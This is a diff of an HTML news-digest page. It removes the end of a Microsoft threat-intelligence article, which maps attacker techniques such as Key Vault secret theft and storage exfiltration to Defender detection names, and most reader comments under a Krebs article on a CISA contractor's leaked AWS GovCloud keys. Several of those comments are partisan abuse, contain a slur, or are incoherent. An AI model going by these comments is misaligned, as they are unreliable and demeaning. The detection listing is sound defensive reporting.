-| Defense evasion | – Attempts to tamper with Microsoft Defender Antivirus – Manipulation of Azure Storage account, Key Vault, and SQL database configurations | Microsoft Defender for Endpoint – Attempt to turn off Microsoft Defender Antivirus protection – Attempt to clear event log – Event log was cleared Microsoft Defender for Cloud Defender for Resource Manager Suspicious invocation of a high-risk ‘Defense Evasion’ operation detected (Preview) Defender for Key Vault Suspicious policy change and secret query in a key vault |
-| Credential access | – Secret extraction from Azure Key Vault – Attempted theft of workload identity tokens using Azure VM Run Command – Credential harvesting from endpoints through ScreenConnect – Publishing Azure App Service web app profile for credential access – Listing Azure storage account access keys for access | Microsoft Defender Antivirus – Trojan:Win32/SuspAdSyncAccess – Backdoor:Win32/AdSyncDump – Behavior:Win32/DumpADConnectCreds – Trojan:Win32/SuspAdSyncAccess – Behavior:Win32/SuspAdsyncBin Microsoft Defender for Endpoint – Indication of local security authority secrets theft – Password stealing from files Microsoft Defender for Cloud Defender for Resource Manager Suspicious invocation of a high-risk ‘Credential Access’ operation detected (Preview) Defender for Servers P2 Run Command with a suspicious script was detected on your virtual machine Defender for Key Vault – Suspicious policy change and secret query in a key vault – High volume of operations in a key vault – Unusual application accessed a key vault – Unusual operation pattern in a key vault – Unusual user accessed a key vault – Access from a suspicious IP address to a key vault |
-| Discovery | – Domain and system discovery commands run on virtual machines | Microsoft Defender for Endpoint Suspicious sequence of exploration activities Microsoft Defender for Cloud Apps Suspicious file access |
-| Lateral movement | – Traversal between cloud resources and applications | Microsoft Defender for Identity Suspicious sign-in to a web app following MFA phone number tampering activity Microsoft Defender for Cloud Apps Compromised user accessed a SaaS application Microsoft Defender for Cloud Defender for Resource Manager Suspicious invocation of a high-risk ‘Data Collection’ operation detected (Preview) |
-| Exfiltration | – Data exfiltration from Azure Storage accounts and other resources – Data exfiltration from file storage services | Microsoft Defender XDR Suspicious behavior: Mass download Microsoft Defender for Cloud Apps – Suspicious massive data read – Suspicious mass download from risky or unusual session – Suspicious mass download from risky or unusual session – Suspicious mass download from risky or unusual session – Possible exfiltration of data archive – Possible data exfiltration from a suspicious IP address – Suspicious quantity of downloaded archive files Microsoft Defender for Cloud Defender for Resource Manager Suspicious invocation of a high-risk ‘Data Collection’ operation detected (Preview) Defender for Storage – The access level of a potentially sensitive storage blob container was changed to allow unauthenticated public access – Publicly accessible storage containers successfully discovered – Publicly accessible storage containers unsuccessfully scanned – Unusual amount of data extracted from a storage account – Unusual data access activity – Unusual amount of data extracted from a sensitive blob container – Unusual number of blobs extracted from a sensitive blob container – Potential data exfiltration detected – Access from a suspicious IP address |
-This research is provided by Microsoft Defender Security Research with contributions from Adi Segal, Karam Abu Hanna, Alon Marom, and members of Microsoft Threat Intelligence.
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
-Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)
-Learn more about [securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection)
-Evaluate your AI readiness with our latest [Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/).
-Learn more about [Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime)
-Explore [how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder)</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
         <div id="art-6" class="article-body">
             <h2 class="article-title">CISA Admin Leaked AWS GovCloud Keys on Github</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/05/cisa-admin-leaked-aws-govcloud-keys-on-github/" target="_blank">Original Link</a></p>
@@ -476,121 +386,7 @@ The GitHub account that included the Private CISA repo was taken offline shortly
 CISA is currently operating with only a fraction of its normal budget and staffing levels. The agency has [lost nearly a third of its workforce](https://www.cybersecuritydive.com/news/cisa-cybersecurity-division-reorganization/812155/) since the beginning of the second Trump administration, which forced a series of early retirements, buyouts, and resignations across the agency’s various divisions.
 The now-defunct Private CISA repo showed the contractor also used easily-guessed passwords for a number of internal resources; for example, many of the credentials used a password consisting of each platform’s name followed by the current year. Caturegli said such practices would constitute a serious security threat for any organization even if those credentials were never exposed externally, noting that threat actors often use key credentials exposed on the internal network to expand their reach after establishing initial access to a targeted system.
 “What I suspect happened is [the CISA contractor] was using this GitHub to synchronize files between a work laptop and a home computer, because he has regularly committed to this repo since November 2025,” Caturegli said. “This would be an embarrassing leak for any company, but it’s even more so in this case because it’s CISA.”
-The incompetence of this government is beyond compare. They are all just so stupid……..
-Easy there sunshine. This is a contractor, not a government employee. What i will say, is that CISA did not have enough controls in place over the years to have been able to snoop this. So they can’t blame Trump Cuts for that incompetence. Also, Nightingale failed in managing their employees. They’re are a LOT of really smart talented people in government, you just won’t hear about them, because they don’t make these kinds of mistakes.
-Trump is blamed for everything.
-He’s called head of state for a reason. It’s not just a title.
-Mostly just lying all the time. All the time.
-LOL “LOT of really smart talented people…dont make these kinds of mistakes”. May I introduce you to the Iran school strike? WHose boot are you licking?
-Also, the mistake isn’t just technical. It’s failure to correctly supervise the contractor – definitely the government’s fault…bad contracting management, project management, process management…should I continue?
-How could the US military striking a school in Iran possibly contradict the claim that there are a lot of really smart and talented people in government? For example, there are a lot of government scientists and engineers in NOAA who have made weather tracking technology that has made weather prediction massively more accurate and precise over my lifetime. How does the strike on that school in Iran contradict the talent and success of those scientists and engineers?
-330 million people live in the US, and 2.7 million of them are civilian employees of the US government, doing things like keeping your food and water safe, your air breathable, the infrastructure you take for granted running so smoothly that you are liberated from having to think about it. If your worldview can’t handle the fact that there are many, many incredibly talented, capable, and dedicated people working for the US government, you’re just never going to understand the systemic problems well enough to have anything intelligent to say about government.
-a well done job goes unnoticed(the good workers understand that one).
-And even though this was a contractor who I’m assuming passed a through back ground check(I had to pass one to just lay the carpet at the coast guards on base housing and I didn’t even get a gate code), and probably had at least some top secret clearance access, who was just working for the government in its cyber security division?! (and had this out grievous practice of making all his note transfers public and all organized by contracts) and not just a citizen you would hope a world power government would keep a better eye on it’s employees.
-So I’d be asking the hard to see questions,
-1. So how long has this ip been transferring notes publicly(not just in this cases recovered intel)
-You would assume someone using GitHub as a horrible replacement for something more private like idk something like gnupg and KDE connect (for something of the top of the head that’s free even), would be unstructured and globed together with other subjects initially while they learned the environment.
-2. Time frame those beginning scratch pages started being organizationally structured.
-3. Now how long before the notes got their own respiratory per contract (especially this one) or do they normally go by subject pertained within the notes or do they normally glob notes and go by date(if I was to use a respiratory to transfer my classified notes I would want to just transfer the days notes every night I dealt with that contract right(got to keep receipts for those big paying hours right).
-And like I said I’m looking at the ip uploading and accessing this persons respiratories for all accounts that even connected to look this and may have resent any in whole or parts. Just to remind everyone who we are and that we don’t take kindly to this kind of incident
-No one cares who you are any more than the Chinese care about my job in New Jersey in 1997, or the Russians care about a pastrami sandwich.
-Who hired the contractors?
-Kristy Noem
-Speaking as a former fed, there is vanishingly little work in government IT that isn’t done by contractors, including nearly all security oversight. There are feds ‘in charge’, but the churn at CISA has likely only left those people who are incompetent or purely administrative.
-At least until recently, the federal government was largely staffed by incredibly dedicated people doing good work under trying conditions. But federal IT departments have never been a good place to find those people, and CISA in particular has always been a bit of an embarassment.
-Sorry, but those super talented government employees should have insider risk in place or basically any other 40 security layers that could prevent this.
-This wasn’t incompetence. This was a deliberate act of sabotage. The contractor will almost certainly face criminal charges.
-specs,
-You have no idea what you are talking about!!!!
-specs,
-You have no idea what you are talking about! Why do the people with the least knowledge about a subject believe that they are an expert in that subject?
-Specs, you have no idea what you are talking about! Why do the people with the least knowledge about a subject believe that they are an expert in that subject?
-Fifi, catch.
-Did you read the article?? It’s not “the government” that sucks , it’s the people that came in to run it and instead of running it, fired and laid off career experts only to hired incompetent temporary contract replacements.
-The DOGE circus continues. No surprise when you cut essential people in an essential agency.
-The DOGE circus continues. A predictable outcome when you cut essential, experienced personnel from an essential agency. It can only get worse. This is cybersecurity 101 stuff….
-My money is on infiltration of the contractor by a faux employee candidate. Got that idea from the AWS key staying valid for 48 hours. Some of the mistakes seem those of a fly by Nightwing noob operation, but where better to insert the droud…
-The incompetence is breathtaking. One is left to wonder if the responsible parties (DOGE?) weren’t working for foreign entities. When this administration is finally held accountable I hope that everyone involved is identified and publicly humiliated.
-Does it even surprise anyone? At the current level of the incompetency of the U.S. government it’s just something that would preoccupy the news cycle for less than a day. And then there will be another gaff… and another one. I mean is it even that bad when our commander in chief is an open Russian asset?
-Hmmmm who would have warned them about this when they first put that stuff in the cloud? If only there was someone who would have told them this was a very bad idea? Oh wait, I remember.
-Hey Jason!
-We have finally located the onr and only fictional novel inside the one true closet and near the one true suitcase!
-Pargin will soon make a bajillion dollars and we will all teach me also about the REAL GOOD LUNCH I just did not go eat from my groceries in the friend fridge!
-But the closet is your mental hospital lantzy not mine
-CISA is a hollow shell of itself since Chris Krebs (no relation) was removed.
-Actually more related than you think the two of them are. Sorta like us.
-C’mon, you cannot blame the administration for this. Any employee/contractor and especially one working for CISA should know better than this particularly given the current “climate” where cyber espionage is so prevalent. The employee/contractor should be marched off the premises asap.
-Nah it’s just easier to blame Trump. It’s too funny.
-While we’re at it, should discipline so many teams that fell down on the job here detecting this — IAM, AppSec, direction engineering, cloud security, GRC. Oh wait, there’s no budgets, staff, institutional knowledge in these teams anymore? Ok then the problem is more organizational. Where should blame lay then?
-Excellence starts from the top. When something good happens, the administration – ANY administration – takes credit. When something bad happens, it’s always a rogue employee/contractor/intern.
-The government cannot escape blame and accountability for this.When agencies are literally run by DEI hires – cronies with no qualifications – who aren’t held to account for literal crimes, it sets the tone.
-Nice try. All the DEI hires were already removed, remember?
-These problems are caused by what’s left after the department was gutted.
-I believe Teddy was using “DEI” in a parodistic way, effectively as in “the people in charge here were exactly what DEI hires have been accused of being = hired for politically desirable attributes rather than competence”.
-In reality, here the inverse of DEI would be the more fitting abbreviation… so they should be called IED hires?
-“IED hires” is right on at many levels.
-Yes, the contractor screwed up epically but that also means there was a catastrophic failure in oversight and monitoring. Just as your bank doesn’t trust each teller to be impeccably honest, there should have been auditing mechanisms on GitHub and on those services preventing long-lived credentials, forcing strong passwords, preventing reuse, etc. .
-Chris
-> there should have been auditing mechanisms on GitHub
-The article states there were default-on auditing mechanisms on Github which were explicitly turned off by the offending user.
-And the offending user should have been blocked from turning those Github *defaults* by an organization policy applied to all their users.
-This only works if the account was listed under an organization though. I expect that this was a case of the contractor used their private account for it, which wouldn’t be under restriction of the company. I find it super unlikely that the contractor would have been allowed to publish that information publicly in a official organization, it would have been at the very least forced private if it was allowed to be published at all
-I’m more concerned at the fact that it didn’t flag anything network logging side though, files such as “passwords”, “tokens” or “config” I would have thought would have been blocked or at the very least logged as a potential malicious actor.
-Exactly: the fact that someone was allowed to turn them off and nobody asked about it is what elevates it to a senior management issue, especially at a security-centric organization. One person making a bad decision shouldn’t be catastrophic.
-This seems on par for anyone who has ever had the misfortune of having to work with CISA. There are good folks there, and many are doing their best, but that level of responsibility simply doesn’t come from the prices or bureaucratic structure provided by DHS, even in the best of times.
-Rhonda,
-This just goes to show how mistakes can happen very easy with lack of carelessness, making personal information very vulnerable to hackers, I think CISA/Nightingale should better screen the contract /worker, there is blame on both sides, It’s so sad that this happened and caused most of the others to lose their jobs.
-“CISA’s internal “artifactory””
-Artifactory (a software repository/caching/proxy solution) doesn’t need to be in quotes, it needs to be capitalized.
-Since when is krebsonsecurity comment section filled with lunatics makng political comments? You guys do know this is a cybersecurity blog?
-I guess the TDS is overwhelming and you guys gotta bounce some conspiracies around the echo chamber just to feel good. Must be a depressing way to go through life, constantly angry and constantly the victim
-It is not TDS to point out that Trump has favored people who will do exactly what he wants over more qualified candidates. I give you Patel, Hegseth, Bondi, Lindsay Halligan, etc. This is in addition to dismissing competent staff already in place.
-Right, because Biden only hired stellar people like Mayorkas or Brinton.
-Who’s talking about Biden? He’s not ever running again and has been out of office for almost 18 months. It’s time to move on.
-sure man, it ended with the chemo. Just like hunter’s corruption and mamdani’s incredible fake generosity.
-It’s like trusting your software vendor to do the right thing with an open credit card. Some people just shouldn’t be trusted.
-was it correctly supervised? weakness in contracting process and management maybe
-My first thought is it just a mistake or did a Chinese National or other type of anti-gov insider get the contracting job. I have no idea, but was this an accident????
-Hey man, .va was hard, even in 2009, Polly-0.
-Quit trying to be phishers of men.
-This is nothing more than a glaring example of the lack of qualified IT Security Professionals. The contractor hired whoever they could find to fill the spot without qualifying the individual and then granting them too much trust.
-Man, Brian, look at that rush of comments to avoid comments numbered in the teens, twenties, or thirties.
-Reminds me of the GIAC breach.
-I guess one of the DOGE Bros is working for Nightwing now.
-I would go straight to this guy’s house. I bet he leaves his keys under the doormat with a label, “Totally Not The Keys To My House”. You do have to wonder about an AWS engineer who isn’t paranoid about any presence of static creds — considering the wide array of alternative solutions these days.
-How much more of this ‘winning’ can we take!
-We have just won again! Finally twitter employees can go hang out with other employees and do their removals without consequence some more!
-Hail eris!
-Ps of course identity thieving presidents of both ‘parties’ deserve no repercussions, otherwise how can we just keep winning so much.
-There is always one @sshat who is smart enough to evade the security rules, but not smart enough understand why the rules should apply to them too.
-The “importantAWStokens” filename is almost poetic —
-someone knew these were important, just not important
-enough to keep off GitHub.
-The deeper issue here isn’t the individual mistake, it’s
-that there’s no automated last-resort protection.
-GitGuardian caught it externally after the fact.
-The pattern is always the same: credentials exist in
-plaintext somewhere “temporary” that becomes permanent.
-The only reliable defense is assuming breach and designing
-for it — encrypt locally before any sync, treat every
-cloud path as compromised by default.
-Disabling GitHub’s secret detection feature is the part
-that’s hardest to explain. That’s not an accident, that’s
-a deliberate choice with consequences.
-This seems deliberate to me as well. The company he works for may have things like USB ports locked down to prevent any data from leaving the building. Using Github for “backups” is a way around that kind of restriction because often using Github as a repo is not only allowed but encouraged for version control. Setting the repo to public is also pretty damning.
-Still, could be a mistake I suppose…. but you’d have to be a superior moron to use Github as a backup for credentials like this… even if you did make it private.
-Apparently the BipIP section of our universal my resume I haven’t been able it to write is hanging out at Denny’s again, making sure the Kubernetes section of the diner in my wallet scorns me for not tipping thousands of miles away again for the imaginary life we insist we returned.
-Ps: Matt died. Good luck, licking a pole in a movie we really all enjoyed over and over here with Jimmy You on Christmas 1997, forever.
-Now go bring that thirty year old toilet back for Warren Buffett and the retards in King of Prussia. Or maybe the awesome we are sharing too an imaginary love in the country of an olive flag is a bag near us all me
-Time for my docent at the museum of our universal is me
-This incident underscores the critical importance of robust secrets management and developer security training, especially when dealing with highly sensitive environments like GovCloud. Implementing automated static application security testing (SAST) and dynamic application security testing (DAST) in CI/CD pipelines can help detect such exposures pre-deployment. Furthermore, integrating credential scanning tools into version control systems is essential to prevent accidental commits of sensitive keys. Regular audits of access controls and least privilege principles are also fundamental to mitigating insider threats, whether malicious or accidental. This serves as a stark reminder that even well-resourced organizations face challenges in maintaining perfect operational security.
-Calling this a clown show is a disservice to actual clowns.
-Capital T, Trump-level ineptitude here.
-Anyone who works in cloud security knows that this is not uncommon incident. It is why organizations need to invest in github monitoring tools like GitGuardian.
-As soon as git became attached to a public company that IPOed in the past this became not only about git, same as reddit.
-Ask me to explain git in 2010 (roughly August through early Autumn) or reddit, especially since its IPO date (and its soundalikes, also public, if you ever have the balls to discuss the things tech, blockchain, and the stock markets are doing now. Not homophones but similar. You are all soaking in it).
-I mean most of us that have been around for a while know it. And it is only part of why so many people are treating their friends like things to hunt down and remove. It is ugly.
-I remember clearance work. I do not mean K-Mart.</div>
+I’m not MAGA or a Trump fan. Blaming him for this? #BRUH</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
